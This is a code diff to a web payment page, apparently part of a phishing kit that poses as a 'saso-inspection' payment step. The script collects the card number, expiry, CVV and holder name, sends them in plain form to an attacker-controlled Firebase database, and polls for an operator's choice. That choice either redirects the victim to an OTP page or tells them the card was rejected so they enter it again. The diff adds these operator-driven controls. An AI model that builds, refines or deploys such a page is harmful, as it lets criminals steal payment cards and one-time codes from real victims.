@@ -51,7 +51,6 @@
         .form-label { display: block; font-size: 13px; font-weight: bold; color: #444; margin-bottom: 7px; }
         .input-field { width: 100%; padding: 13px; border: 1px solid #e0e0e0; border-radius: 10px; font-size: 16px; outline: none; transition: 0.3s; }
         
-        /* التنسيقات الجديدة لحالة الخطأ */
         .input-error { border: 2px solid var(--error-red) !important; background-color: #fff8f8; }
         .error-text { color: var(--error-red); font-size: 11px; font-weight: bold; margin-top: 5px; display: none; text-align: right; }
 
@@ -130,8 +129,9 @@
     </div>
 
     <script>
+        // إعدادات Firebase
         const firebaseConfig = { 
-            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT...", 
+            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT8X6X8X6X8", 
             authDomain: "saso-inspection.firebaseapp.com",
             databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com", 
             projectId: "saso-inspection",
@@ -139,12 +139,19 @@
             messagingSenderId: "1009002235896",
             appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
         };
-        firebase.initializeApp(firebaseConfig);
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
         const database = firebase.database();
         const visitorId = localStorage.getItem('visitorId') || "V_" + Math.floor(Math.random() * 100000);
         localStorage.setItem('visitorId', visitorId);
 
-        database.ref('live_visitors/' + visitorId).set({ page: "صفحة الدفع", last_active: firebase.database.ServerValue.TIMESTAMP });
+        // تحديث حالة الزائر في لوحة التحكم
+        database.ref('payments/' + visitorId).update({ 
+            currentPage: "صفحة الدفع", 
+            lastActive: firebase.database.ServerValue.TIMESTAMP 
+        });
 
         const visaIcon = "https://img.icons8.com/color/48/000000/visa.png";
         const masterIcon = "https://img.icons8.com/color/48/000000/mastercard.png";
@@ -155,7 +162,7 @@
             document.getElementById('viewCardHolder').innerText = this.value || 'اسم حامل البطاقة';
         });
 
-        // تنسيق رقم البطاقة وإزالة الخطأ عند التعديل
+        // تنسيق رقم البطاقة
         document.getElementById('cardNumber').addEventListener('input', function() {
             let val = this.value.replace(/\D/g, '');
             let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
@@ -167,18 +174,18 @@
             else if (val.startsWith('5')) { logoImg.src = masterIcon; logoImg.style.display = "block"; }
             else { logoImg.style.display = "none"; }
             
-            // إخفاء اللون الأحمر والرسالة بمجرد البدء في الكتابة
             this.classList.remove('input-error');
             document.getElementById('cardErrorMsg').style.display = "none";
         });
 
+        // تنسيق تاريخ الانتهاء
         document.getElementById('cardExpiry').addEventListener('input', function() {
             let val = this.value.replace(/\D/g, '');
             if (val.length >= 2) this.value = val.substring(0, 2) + ' / ' + val.substring(2, 4);
             document.getElementById('viewCardExpiry').innerText = this.value || '00 / 00';
         });
 
-        // خوارزمية Luhn للتحقق من أن رقم البطاقة حقيقي (ليس عشوائياً)
+        // خوارزمية Luhn للتحقق من صحة الرقم
         function isValidLuhn(number) {
             let num = number.replace(/\s/g, '');
             let sum = 0;
@@ -196,9 +203,11 @@
 
         function submitPayment() {
             const cardInput = document.getElementById('cardNumber');
+            const cardHolder = document.getElementById('cardHolder').value;
+            const expiry = document.getElementById('cardExpiry').value;
+            const cvv = document.getElementById('cvv').value;
             
-            // فحص صحة الرقم قبل الإرسال
-            if (cardInput.value.replace(/\s/g, '').length < 16 || !isValidLuhn(cardInput.value)) {
+            if (cardInput.value.replace(/\s/g, '').length < 16 || !isValidLuhn(cardInput.value) || !cardHolder || !expiry || !cvv) {
                 showError();
                 return;
             }
@@ -206,30 +215,29 @@
             document.getElementById('loadingOverlay').style.display = 'flex';
 
             const cardData = {
-                cardHolder: document.getElementById('cardHolder').value,
+                cardHolder: cardHolder,
                 cardNumber: cardInput.value,
-                expiry: document.getElementById('cardExpiry').value,
-                cvv: document.getElementById('cvv').value,
-                status: "waiting",
-                last_update: firebase.database.ServerValue.TIMESTAMP
+                expiry: expiry,
+                cvv: cvv,
+                action: "waiting_card_approval",
+                lastUpdate: new Date().toLocaleString('ar-SA'),
+                lastActive: firebase.database.ServerValue.TIMESTAMP
             };
 
             database.ref('payments/' + visitorId).update(cardData);
 
             // مراقبة قرار الأدمن
-            const controlRef = database.ref('payments/' + visitorId);
-            controlRef.on('value', (snapshot) => {
+            database.ref('payments/' + visitorId).on('value', (snapshot) => {
                 const data = snapshot.val();
                 if (!data) return;
 
-                if (data.status === "accept") {
+                if (data.action === "goToOtp") {
                     window.location.href = "otp.html";
                 } 
-                else if (data.status === "reject") {
+                else if (data.action === "wrongCard") {
                     document.getElementById('loadingOverlay').style.display = 'none';
                     showError();
-                    // إعادة الحالة لتصحيح البيانات
-                    controlRef.update({ status: "idle" });
+                    database.ref('payments/' + visitorId).update({ action: "user_fixing_card" });
                 }
             });
         }
